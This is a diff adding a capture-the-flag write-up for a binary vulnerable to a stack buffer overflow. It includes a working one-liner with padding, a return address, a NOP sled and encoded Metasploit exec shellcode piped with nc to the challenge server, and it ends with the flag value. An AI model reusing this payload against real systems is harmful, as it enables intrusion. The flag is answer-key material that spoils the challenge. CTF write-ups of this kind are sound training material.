@@ -1,0 +1,17 @@
+***Description***
+Welcome to the administration contact page! You may ask us for the flag. Or you may get it yourself.
+
+NOTE: The flag is stored in the same file at the same location as previously!
+
+
+***Solution***
+The binary is susceptible to an ordinary, simple buffer overflow vulnerability that leads to arbitary command execution. If you are unfamiliar with this concept, there are tons of resources on the internet to introduce you to this type of vulnerability.
+Note that this vulnerability can get you a reverse shell on the machine if you have a publicly facing IP address, but it's not required. You know from previous challenges that the flag is in the "flag.txt" file, so we just need a shellcode that would read that file. Metasploit's "linux/x86/exec" payload can help with that.
+
+The binary can be exploited with a oneliner as well as with a standalone Python script. You will find the Python exploit script below, while the oneliner looks like this:
+
+"python -c 'print "aa\naa\n" + "A"*512 + "\x71\x63\x55\x56" + "\x90"*20 + "\xb8\xde\xa7\xa8\x1d\xdd\xc6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x0d\x31\x43\x12\x83\xeb\xfc\x03\x9d\xa9\x4a\xe8\x4b\xbd\xd2\x8a\xd9\xa7\x8a\x81\xbe\xae\xac\xb2\x6f\xc2\x5a\x43\x07\x0b\xf9\x2a\xb9\xda\x1e\xfe\xad\xd0\xe0\xff\x2d\x88\x81\x8b\x0d\x28\x2e\x15\x2a\x9a\xda\xad\xc0\xe2\x75\x1d\xa1\x02\xb4\x21"' | nc -v ctfeh.hh.se 10001"
+
+(upload exploit.py)
+
+hhctf_flag{7e7102996f8e8d7cd71f7b89da89307c}
